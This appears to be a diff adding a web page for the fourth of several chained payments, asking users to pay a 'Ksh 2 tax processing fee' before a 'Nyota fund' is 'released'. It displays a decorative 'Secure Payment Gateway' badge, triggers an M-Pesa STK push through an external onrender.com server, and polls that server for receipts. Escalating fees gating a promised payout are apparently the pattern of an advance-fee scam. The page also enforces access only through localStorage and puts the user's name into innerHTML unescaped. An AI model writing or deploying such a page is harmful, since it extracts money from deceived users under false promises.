@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment 4 – Tax Processing</title>
+<link rel="stylesheet" href="style.css">
+
+<style>
+.security-badge{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  background:#eef4ff;
+  padding:10px;
+  border-radius:8px;
+  margin-bottom:12px;
+  font-size:14px;
+}
+.security-badge span{
+  font-weight:bold;
+  color:#0a6ebd;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Final Payment – Tax Processing</h2>
+
+<div class="security-badge">
+🔒 <span>Secure Payment Gateway</span>
+</div>
+
+<p id="congratsMsg"></p>
+
+<form id="payment4Form">
+<input id="senderName" required>
+<input id="senderPhone" required>
+<button type="submit" id="payBtn">Pay Ksh 2</button>
+</form>
+
+</div>
+
+
+<!-- POPUP -->
+<div id="popupOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:999;">
+<div class="popupContent nyota-card">
+<h3 id="popupTitle"></h3>
+<div id="popupSpinner"></div>
+<p id="popupMessage"></p>
+<button id="popupBtn" style="display:none">OK</button>
+</div>
+</div>
+
+
+<script>
+
+/* ===== Access Protection ===== */
+if(!localStorage.getItem("payment3Completed")){
+window.location.href="payment3.html";
+}
+
+
+/* ===== Load user EXACT like payment2 ===== */
+const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
+const phone = localStorage.getItem("userPhone");
+const currentUser = users.find(u => u.phone === phone);
+
+
+/* ===== Elements ===== */
+const senderName = document.getElementById("senderName");
+const senderPhone = document.getElementById("senderPhone");
+const congratsMsg = document.getElementById("congratsMsg");
+const payBtn = document.getElementById("payBtn");
+
+const popupOverlay = document.getElementById("popupOverlay");
+const popupTitle = document.getElementById("popupTitle");
+const popupSpinner = document.getElementById("popupSpinner");
+const popupMessage = document.getElementById("popupMessage");
+const popupBtn = document.getElementById("popupBtn");
+
+
+/* ===== Autofill ===== */
+if(currentUser){
+senderName.value = currentUser.fullname;
+senderPhone.value = currentUser.phone;
+}
+senderPhone.readOnly = true;
+
+
+/* ===== Message ===== */
+const userName = currentUser ? currentUser.fullname : "User";
+
+congratsMsg.innerHTML = `
+<strong>Congratulations ${userName}</strong> you're on the final step.<br><br>
+You are required to complete a <strong>Ksh 2 tax processing fee</strong>.<br><br>
+After payment your Nyota fund will be finalized and released.
+`;
+
+
+/* ===== Popup Helper ===== */
+function showPopup(title,message="",spin=false,ok=false){
+
+popupTitle.innerText = title;
+
+popupMessage.innerHTML = message;
+
+popupSpinner.innerHTML = spin
+? '<div style="width:30px;height:30px;border:4px solid #eee;border-top:4px solid #0a6ebd;border-radius:50%;animation:spin 1s linear infinite"></div>'
+: '';
+
+popupBtn.style.display = ok ? "block" : "none";
+
+popupOverlay.style.display = "block";
+}
+
+popupBtn.onclick = ()=> popupOverlay.style.display="none";
+
+
+/* ===== Submit ===== */
+document.getElementById("payment4Form").addEventListener("submit", async e=>{
+
+e.preventDefault();
+
+payBtn.disabled=true;
+
+showPopup("Processing...","Sending STK Push",true,false);
+
+try{
+
+const res = await fetch("https://server-d7ya.onrender.com/pay",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+phone: senderPhone.value,
+amount:2
+})
+});
+
+const data = await res.json();
+
+if(!data.success) throw new Error();
+
+showPopup("STK Sent 📲","Enter your M-Pesa PIN",true,false);
+
+pollReceipt(data.reference);
+
+}catch{
+
+payBtn.disabled=false;
+showPopup("Payment Failed","Unable to send STK push",false,true);
+
+}
+
+});
+
+
+/* ===== Poll Receipt ===== */
+function pollReceipt(ref){
+
+let attempts=0;
+
+const interval=setInterval(async ()=>{
+
+attempts++;
+
+if(attempts>60){
+clearInterval(interval);
+return showPopup("Still Processing","Tap OK and wait",false,true);
+}
+
+try{
+
+const r=await fetch(`https://server-d7ya.onrender.com/receipt/${ref}`,{cache:"no-store"});
+if(!r.ok) return;
+
+const d=await r.json();
+const status=(d?.receipt?.status||"").toLowerCase();
+
+if(status==="pending") return;
+
+clearInterval(interval);
+
+if(["success","completed","paid","processing"].includes(status)){
+
+localStorage.setItem("payment4Completed","yes");
+
+showPopup("Payment Confirmed ✅","Final step completed",false,true);
+
+popupBtn.onclick=()=>window.location.href="success.html";
+
+setTimeout(()=>window.location.href="success.html",4000);
+
+}else{
+
+payBtn.disabled=false;
+
+showPopup("Payment Failed","Please try again",false,true);
+
+}
+
+}catch{}
+
+},5000);
+
+}
+
+</script>
+
+</body>
+</html>
